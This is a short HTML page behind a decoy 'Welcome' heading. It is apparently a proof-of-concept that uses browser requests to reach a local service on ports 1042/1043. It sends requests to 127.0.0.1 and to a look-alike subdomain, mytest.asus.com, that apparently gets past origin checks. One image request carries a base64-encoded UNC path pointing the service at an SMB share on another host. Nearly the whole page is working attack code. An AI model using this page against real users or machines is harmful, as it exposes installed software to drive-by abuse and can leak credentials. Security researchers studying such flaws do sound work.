<!DOCTYPE html>
<html>

<head>
    <title>Welcome</title>
</head>

<body>
    <h1>Welcome to our website!</h1>
    <p>Loading content, please wait...</p>
    <button type="button" onclick="sendRequest1()">Send to 127.0.0.1</button>
    <button type="button" onclick="sendRequest2()">Send to mytest.asus.com with HTTP</button>
    <button type="button" onclick="sendRequest3()">Send to mytest.asus.com with HTTPS</button>
    <button type="button" onclick="putImage1()">Put image with HTTP request</button>
    <button type="button" onclick="putImage2()">Put image with UNC network paths</button>
    <script>
        function sendRequest1() {
            fetch('http://127.0.0.1:1042/lib/1/language');
        }

        function sendRequest2() {
            fetch('http://mytest.asus.com:1042/lib/1/language');
        }

        function sendRequest3() {
            fetch('https://mytest.asus.com:1043/lib/1/language');
        }

        function putImage1() {
            const img = document.createElement('img');
            img.src = 'https://mytest.asus.com:1043/lib/1/language';
            document.body.appendChild(img);
        }

        function putImage2() {
            const img = document.createElement('img');
            img.src = 'http://127.0.0.1:1042/type/1/model/x/image/' + btoa('\\\\192.168.48.134\\s\\i.jpg');
            document.body.appendChild(img);
        }
    </script>
</body>

</html>
